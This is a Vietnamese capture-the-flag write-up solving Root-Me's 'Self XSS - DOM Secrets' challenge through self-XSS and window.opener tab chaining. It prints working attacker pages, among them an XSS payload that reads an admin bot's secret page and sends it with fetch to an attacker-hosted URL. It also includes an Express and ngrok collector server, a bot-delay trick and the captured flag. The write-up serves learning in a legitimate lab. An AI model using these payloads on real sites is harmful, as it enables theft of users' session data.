# ROOT-ME

## Self XSS - DOM Secrets

Bài này tương tự như TBDXSS

Challenge này cho chúng ta nhập vào `username` và `secret`, sau khi nhập xong thì chúng ta có thể xem secret ở `/profile`. Test thử xss ở 2 đầu vào này thì chỉ có secret bị filter còn `username` thì không do đó ta có thể trigger được xss `<script>alert(1)</script>`.

Nhưng mấu chốt của bài này không nằm ở đó, bởi vì đầu vào gây ra xss cũng sẽ khiến secret của admin bot thay đổi. Ta không thể đọc trực tiếp từ `attacker site` bởi vì dính CORS, nhưng vì có thể xss do đó chúng ta có thể lợi dụng điều này để đọc flag bởi vì hai tab cùng origin. 

Ý tưởng là giữ một tab chứa secret đã in ra và một tab chứa tải trọng xss đọc secret từ tab đó. Bài này có hai cách để giải quyết:
- Đặt tên cho cửa sổ bằng `window.open('http://example.com', 'hehehe');`, sau đó ở trang xss sẽ mở cửa sổ hehehe bằng `window.open('', 'hehehe');`. Nhưng hình như bây giờ browser đã chặn cách này bằng cơ chế same origin rồi. Các bạn có thể kiểm tra như writeup [này](https://ctftime.org/writeup/30882) của tác giả.
- Bây giờ chỉ còn cách sử dụng window.opener như bài này đề cập.

Nói sơ qua về `window.opener` thì khi chúng ta mở một tab gọi là tab thứ 2 bằng `window.open` từ tab thứ nhất, thì khi đứng ở tab thứ 2, ta có thể tham chiếu đến tab thứ nhất bằng `window.opener` hoặc tab mở ra tab thứ nhất bằng `window.opener.opener` và đệ quy tiếp như vậy. 

Khi tham chiếu đến tab thứ nhất, ta có thể đọc nội dung từ tab thứ nhất từ tab thứ hai nếu cả hai tab đều chung origin. Do đó bây giờ ta CSRF như sau:
> /main
```html
<script>
    window.open(location.href.replace('main', 'form'));
    window.open(location.href.replace('main', 'execute'));
    location.href = 'http://challenge01.root-me.org:58003/profile';
</script>
```
- Khi truy cập vào trang của chúng ta, ta sẽ cho mở hai tab: Một tab submit form chứa payload xss, một tab để thực thi đoạn mã sau khi đã submit form. 
- Sau đó ta sẽ cho tab main này redirect đến `http://challenge01.root-me.org:58003/profile`, mục đích là để ở trang execute với tải trọng từ submit form, khi gọi đến `window.opener` sẽ là window main khi này đã redirect đến trang profile chứa secret của admin. Hai trang bây giờ đã là same origin nên ta có thể đọc được flag từ trang execute.

> /execute
```html
<body>
    <script>
        setTimeout(() => {
            location.href = 'http://challenge01.root-me.org:58003/profile';
        }, 2000);
    </script>
</body>
```

> /form
```html
<body>
    <form method="POST" action="http://challenge01.root-me.org:58003/login" target="_blank" id=f>
        <input id="username" name="username"></input><br>
        <input id="secret" name="secret"></input><br>
    </form>
    <script>
        payload = `
        <script>
            let flag = window.opener.document.body.innerText;
            let encodedFlag = encodeURIComponent(flag);
            fetch('<%= OUR_URL %>/flag?flag=' + encodedFlag);
        \x3C/script>
        `
        f.username.value = payload;
        f.submit();
    </script>
</body>
```

Nhưng như vậy là vẫn chưa thể lấy flag được, bởi vì chắc người làm ra chall này lấy luôn con bot của Chall TBDXSS pbCTF2021, có một đoạn như sau:
```js
try {
    const resp = await page.goto(url, {
        waitUntil: 'load',
        timeout: 20 * 1000,
    });
} catch (err){
    console.log(err);
}
```

Nó chỉ thực hiện đợi cho đến khi load xong thì sẽ kết thúc thay vì sử dụng `networkidle0` như bình thường. Do đó ta cần delay con bot để đủ thời gian lấy flag, ở đây ta có thể delay bằng cách cho load một image mà trang trả về image sẽ delay một thời gian rồi mới trả về kết quả.
> /
```html
<script>
    window.open(location.href + 'main')
</script>
<img src="<%= OUR_URL %>/delay">
```

Mình host server bằng express và ngrok như sau:
```js
const express = require('express');
const app = express();

const PORT = 5000;

const OUR_URL = 'https://bbf7-2001-ee1-fa03-c960-48e3-4a7-ec6b-fdd1.ngrok-free.app';

app.disable('etag');
app.set("view engine","ejs");
app.set("views","./views");

app.get('/execute', (req, res) => {
    res.render('execute', { OUR_URL });
});

app.get('/form', (req, res) => {
    res.render('form', { OUR_URL });
});

app.get('/flag', (req, res) => {
    let flag = req.query.flag;
    console.log(flag);
    res.send('hit the flag');
});

app.get('/main', (req, res) => {
    res.render('main', { OUR_URL });
});

app.get('/delay', function(req, res) {
    setTimeout(()=> {
        res.sendStatus(404);
    }, 20000)
});

app.get('/', (req, res) => {
    res.render('index', { OUR_URL });
});

app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}...`);
});
```

```sh
node ./server.js
ngrok http 5000
```

Flag:

```
Server listening on port 5000...
Secrets Keeper

Login | Profile | Report

Welcome Root-Me Bot, your secret is safe thanks to our no database system.

Everything is stored in your session so, no one can steal it!




Your secret: RM{S4lF_XSS_4r3_D4nG3r0uS}
```

